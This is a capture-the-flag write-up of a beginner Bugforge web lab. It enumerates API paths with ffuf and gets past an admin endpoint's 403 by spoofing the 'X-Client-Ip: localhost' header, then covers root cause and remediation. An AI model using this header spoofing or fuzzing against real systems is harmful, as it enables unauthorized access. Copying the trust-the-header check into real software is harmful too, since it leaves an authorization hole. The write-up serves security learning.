# Diceforge - dice-003 - Request headers.

## Challenge Overview

- **Challenge:** Diceforge
- **Platform:** Bugforge
- **Category:** Web Security
- **Hint:** Request headers
- **Vulnerability:** Client IP Header Spoofing / Authorization Bypass
- **Difficulty:** Beginner

## Objective

Identify the vulnerability in the Diceforge application and access the protected administrative configuration endpoint to retrieve the flag.

---

## 1. Application Reconnaissance

Initially, the application was accessed through the browser, and a dice roll was performed.

### Observed Request

```http
POST /api/roll HTTP/2
Host: lab-1793713556484-fpoc7j.labs-app.bugforge.io
Content-Type: application/json
```

### Observed Response

```json
{
  "notation": "1d100",
  "results": [
    {
      "type": "d100",
      "count": 1,
      "rolls": [100],
      "subtotal": 100
    }
  ],
  "grandTotal": 100
}
```

This confirmed the existence of the `/api/roll` endpoint.

---

## 2. API Endpoint Enumeration

### Tool: ffuf

The API namespace was enumerated using ffuf and the Dirb common wordlist.

```bash
ffuf \
  -u "https://lab-1793713556484-fpoc7j.labs-app.bugforge.io/api/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc all \
  -fc 404 \
  -ac \
  -rate 50 \
  -o ffuf-api.json \
  -of json
```

### Discovered Endpoints

| Endpoint     | Status | Observation                    |
| ------------ | ------ | ------------------------------ |
| `/api/roll`  | 200    | Dice rolling functionality     |
| `/api/stats` | 200    | Statistics endpoint            |
| `/api/admin` | 400    | Potential administrative route |

Further enumeration was performed under `/api/admin/`.

### Administrative Endpoint Enumeration

```bash
ffuf \
  -u "https://lab-1793713556484-fpoc7j.labs-app.bugforge.io/api/admin/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 403 \
  -rate 50 \
  -o ffuf-admin.json \
  -of json
```

### Discovered Endpoint

```text
/api/admin/config
```

The endpoint returned:

```http
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Powered-By: Express
```

Response body:

```json
{
  "error": "Forbidden"
}
```

This indicated that the endpoint existed but access was restricted.

---

## 3. Vulnerability Investigation

The challenge hint was:

> Request headers

The request was intercepted using Burp Suite and sent to Repeater.

### Original Request

```http
GET /api/admin/config HTTP/2
Host: lab-1793713556484-fpoc7j.labs-app.bugforge.io
User-Agent: Mozilla/5.0
Accept: application/json
```

### Original Response

```http
HTTP/2 403 Forbidden
```

Different HTTP request headers were manually tested in Burp Repeater.

During testing, the following header was identified as the vulnerable header:

```http
X-Client-Ip
```

---

## 4. Exploitation

### Modified Request

```http
GET /api/admin/config HTTP/2
Host: lab-1793713556484-fpoc7j.labs-app.bugforge.io
User-Agent: Mozilla/5.0
Accept: application/json
X-Client-Ip: localhost
```

### Successful Response

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Powered-By: Express
```

Response body:

```json
{
  "appName": "DiceForge",
  "version": "1.0.0",
  "apiSecret": "bug{KBrjznrfWCuuoE3IxdnRXq7F1hG5NO1D}",
  "maxDicePerRoll": 20,
  "maxDiceTypes": 7,
  "rateLimit": 100
}
```

The administrative configuration was successfully retrieved by spoofing the client IP through the `X-Client-Ip` request header.

---

## 5. Flag

```text
bug{KBrjznrfWCuuoE3IxdnRXq7F1hG5NO1D}
```

---

## 6. Root Cause Analysis

The application appears to trust the client-supplied `X-Client-Ip` header when determining whether a request originates from localhost.

An illustrative vulnerable implementation could resemble:

```javascript
const clientIp = req.headers['x-client-ip'] || req.ip;

if (clientIp === 'localhost') {
    return res.json(config);
}

return res.status(403).json({ error: 'Forbidden' });
```

This is a hypothetical reconstruction based on observed behavior, not verified backend source code.

### Why the Vulnerability Exists

HTTP request headers can be modified by clients.

If an application uses a client-controlled header directly for authorization decisions, an attacker may be able to manipulate the value and bypass access restrictions.

---

## 7. Security Impact

- Unauthorized access to administrative endpoints.
- Exposure of application configuration.
- Disclosure of sensitive API secrets.
- Potential compromise of additional functionality if exposed secrets are reused.

---

## 8. Remediation

1. Never trust client-controlled IP headers for authorization.
2. Only accept forwarded IP headers from explicitly trusted reverse proxies.
3. Use server-controlled connection information for client IP verification.
4. Avoid relying on localhost checks as the sole authorization mechanism.
5. Implement proper authentication and role-based authorization.
6. Avoid exposing sensitive configuration values through public-facing APIs.

---

## 9. Tools Used

- Burp Suite Community Edition
- ffuf
- curl
- Kali Linux
- Dirb Common Wordlist

---

## 10. Key Learning

This challenge demonstrates how trusting client-controlled HTTP request headers can lead to authorization bypasses.

The most important discovery was that modifying:

```http
X-Client-Ip: localhost
```

changed the server response from:

```http
403 Forbidden
```

to:

```http
200 OK
```

This allowed access to a protected administrative configuration endpoint and revealed the challenge flag.

**Technique:** HTTP Header Manipulation / Client IP Spoofing / Authorization Bypass